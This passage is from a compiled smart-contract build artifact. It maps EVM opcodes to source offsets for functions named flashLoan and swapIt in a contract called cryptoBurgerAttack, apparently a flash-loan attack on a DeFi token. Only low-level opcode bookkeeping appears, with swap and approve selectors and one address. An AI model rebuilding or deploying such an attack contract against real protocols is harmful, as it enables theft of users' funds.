      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1782
      ],
      "op": "AND",
      "path": "0"
    },
    "10479": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1782
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x22C0D9F"
    },
    "10484": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1796,
        1806
      ],
      "op": "DUP4",
      "path": "0"
    },
    "10485": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1820,
        1830
      ],
      "op": "DUP4",
      "path": "0"
    },
    "10486": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1852,
        1856
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "10487": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1882,
        1894
      ],
      "op": "DUP12",
      "path": "0"
    },
    "10488": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1896,
        1903
      ],
      "op": "DUP12",
      "path": "0"
    },
    "10489": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10491": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10492": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "10494": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "ADD",
      "path": "0"
    },
    "10495": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x291D"
    },
    "10498": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "10499": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "10500": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10501": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10503": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10505": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "10507": {
      "op": "SHL"
    },
    "10508": {
      "op": "SUB"
    },
    "10509": {
      "op": "SWAP3"
    },
    "10510": {
      "op": "SWAP1"
    },
    "10511": {
      "op": "SWAP3"
    },
    "10512": {
      "op": "AND"
    },
    "10513": {
      "op": "DUP3"
    },
    "10514": {
      "op": "MSTORE"
    },
    "10515": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "10517": {
      "op": "DUP3"
    },
    "10518": {
      "op": "ADD"
    },
    "10519": {
      "op": "MSTORE"
    },
    "10520": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "10522": {
      "op": "ADD"
    },
    "10523": {
      "op": "SWAP1"
    },
    "10524": {
      "op": "JUMP"
    },
    "10525": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10526": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10528": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10529": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "10531": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10532": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "DUP4",
      "path": "0"
    },
    "10533": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "SUB",
      "path": "0"
    },
    "10534": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "SUB",
      "path": "0"
    },
    "10535": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10536": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "10537": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10538": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10540": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1871,
        1904
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "10541": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10543": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10544": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "DUP6",
      "path": "0"
    },
    "10545": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xFFFFFFFF"
    },
    "10550": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "AND",
      "path": "0"
    },
    "10551": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "10553": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "SHL",
      "path": "0"
    },
    "10554": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10555": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "10556": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "10558": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "ADD",
      "path": "0"
    },
    "10559": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x294B"
    },
    "10562": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "SWAP5",
      "path": "0"
    },
    "10563": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "10564": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "10565": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "10566": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10567": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2ECE"
    },
    "10570": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "jump": "i",
      "offset": [
        1759,
        1914
      ],
      "op": "JUMP",
      "path": "0"
    },
    "10571": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10572": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10574": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10576": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10577": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10578": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "DUP4",
      "path": "0"
    },
    "10579": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "SUB",
      "path": "0"
    },
    "10580": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10581": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10583": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "DUP8",
      "path": "0"
    },
    "10584": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10585": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "10586": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "10587": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10588": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "10589": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2965"
    },
    "10592": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "10593": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10595": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10596": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "REVERT",
      "path": "0"
    },
    "10597": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10598": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "POP",
      "path": "0"
    },
    "10599": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "GAS",
      "path": "0"
    },
    "10600": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "CALL",
      "path": "0"
    },
    "10601": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "10602": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10603": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "10604": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2979"
    },
    "10607": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "10608": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "10609": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10611": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10612": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "10613": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "10614": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10616": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "REVERT",
      "path": "0"
    },
    "10617": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10618": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "POP",
      "path": "0"
    },
    "10619": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "POP",
      "path": "0"
    },
    "10620": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "POP",
      "path": "0"
    },
    "10621": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1759,
        1914
      ],
      "op": "POP",
      "path": "0"
    },
    "10622": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1287,
        1921
      ],
      "op": "POP",
      "path": "0"
    },
    "10623": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1287,
        1921
      ],
      "op": "POP",
      "path": "0"
    },
    "10624": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1287,
        1921
      ],
      "op": "POP",
      "path": "0"
    },
    "10625": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1287,
        1921
      ],
      "op": "POP",
      "path": "0"
    },
    "10626": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1287,
        1921
      ],
      "op": "POP",
      "path": "0"
    },
    "10627": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1222,
        1921
      ],
      "op": "POP",
      "path": "0"
    },
    "10628": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "offset": [
        1222,
        1921
      ],
      "op": "POP",
      "path": "0"
    },
    "10629": {
      "fn": "cryptoBurgerAttack.flashLoan",
      "jump": "o",
      "offset": [
        1222,
        1921
      ],
      "op": "JUMP",
      "path": "0"
    },
    "10630": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12102,
        12819
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10631": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 98,
      "value": "0x40"
    },
    "10633": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10634": {
      "op": "PUSH4",
      "value": "0x95EA7B3"
    },
    "10639": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "10641": {
      "op": "SHL"
    },
    "10642": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10643": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "10644": {
      "offset": [
        733,
        775
      ],
      "op": "PUSH20",
      "path": "0",
      "value": "0x2B0551B656509754285EEC81EE894338E14C5DD"
    },
    "10665": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "10667": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "DUP3",
      "path": "0"
    },
    "10668": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "ADD",
      "path": "0"
    },
    "10669": {
      "op": "MSTORE"
    },
    "10670": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "10672": {
      "op": "DUP2"
    },
    "10673": {
      "op": "ADD"
    },
    "10674": {
      "op": "DUP5"
    },
    "10675": {
      "op": "SWAP1"
    },
    "10676": {
      "op": "MSTORE"
    },
    "10677": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10679": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10681": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "10683": {
      "op": "SHL"
    },
    "10684": {
      "op": "SUB"
    },
    "10685": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12337
      ],
      "op": "DUP7",
      "path": "0"
    },
    "10686": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12337
      ],
      "op": "AND",
      "path": "0"
    },
    "10687": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12337
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10688": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12337
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x95EA7B3"
    },
    "10693": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12337
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10694": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "10696": {
      "op": "ADD"
    },
    "10697": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "10699": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10701": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10702": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10703": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "DUP4",
      "path": "0"
    },
    "10704": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "SUB",
      "path": "0"
    },
    "10705": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10706": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10708": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "DUP8",
      "path": "0"
    },
    "10709": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "GAS",
      "path": "0"
    },
    "10710": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "CALL",
      "path": "0"
    },
    "10711": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "10712": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10713": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "10714": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x29E7"
    },
    "10717": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "10718": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "10719": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10721": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10722": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "10723": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "10724": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "10726": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "REVERT",
      "path": "0"
    },
    "10727": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10728": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "POP",
      "path": "0"
    },
    "10729": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "POP",
      "path": "0"
    },
    "10730": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "POP",
      "path": "0"
    },
    "10731": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "POP",
      "path": "0"
    },
    "10732": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10734": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10735": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "10736": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "10738": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "NOT",
      "path": "0"
    },
    "10739": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "10741": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "DUP3",
      "path": "0"
    },
    "10742": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "ADD",
      "path": "0"
    },
    "10743": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "AND",
      "path": "0"
    },
    "10744": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "DUP3",
      "path": "0"
    },
    "10745": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "ADD",
      "path": "0"
    },
    "10746": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "DUP1",
      "path": "0"
    },
    "10747": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "10749": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "10750": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "POP",
      "path": "0"
    },
    "10751": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10752": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "ADD",
      "path": "0"
    },
    "10753": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10754": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2A0B"
    },
    "10757": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "10758": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10759": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2EAC"
    },
    "10762": {
      "fn": "cryptoBurgerAttack.swapIt",
      "jump": "i",
      "offset": [
        12313,
        12366
      ],
      "op": "JUMP",
      "path": "0"
    },
    "10763": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12313,
        12366
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "10764": {
      "op": "POP"
    },
    "10765": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 99,
      "value": "0x40"
    },
    "10767": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "10768": {
      "op": "PUSH4",
      "value": "0x95EA7B3"
    },
    "10773": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "10775": {
      "op": "SHL"
    },
    "10776": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "DUP2",
      "path": "0"
    },
    "10777": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "10778": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "10780": {
      "op": "DUP1"
    },
    "10781": {
      "op": "MLOAD"
    },
    "10782": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "10784": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "10787": {
      "op": "DUP4"
    },
    "10788": {
      "op": "CODECOPY"
    },
    "10789": {
      "op": "DUP2"
    },
    "10790": {
      "op": "MLOAD"
    },
    "10791": {
      "op": "SWAP2"
    },
    "10792": {
      "op": "MSTORE"
    },
    "10793": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "10795": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "DUP3",
      "path": "0"
    },
    "10796": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12431
      ],
      "op": "ADD",
      "path": "0"
    },
    "10797": {
      "op": "MSTORE"
    },
    "10798": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "10800": {
      "op": "DUP2"
    },
    "10801": {
      "op": "ADD"
    },
    "10802": {
      "op": "DUP5"
    },
    "10803": {
      "op": "SWAP1"
    },
    "10804": {
      "op": "MSTORE"
    },
    "10805": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10807": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "10809": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "10811": {
      "op": "SHL"
    },
    "10812": {
      "op": "SUB"
    },
    "10813": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12400
      ],
      "op": "DUP7",
      "path": "0"
    },
    "10814": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12400
      ],
      "op": "AND",
      "path": "0"
    },
    "10815": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12400
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10816": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12400
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x95EA7B3"
    },
    "10821": {
      "fn": "cryptoBurgerAttack.swapIt",
      "offset": [
        12376,
        12400
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "10822": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "10824": {
      "op": "ADD"
    },
    "10825": {
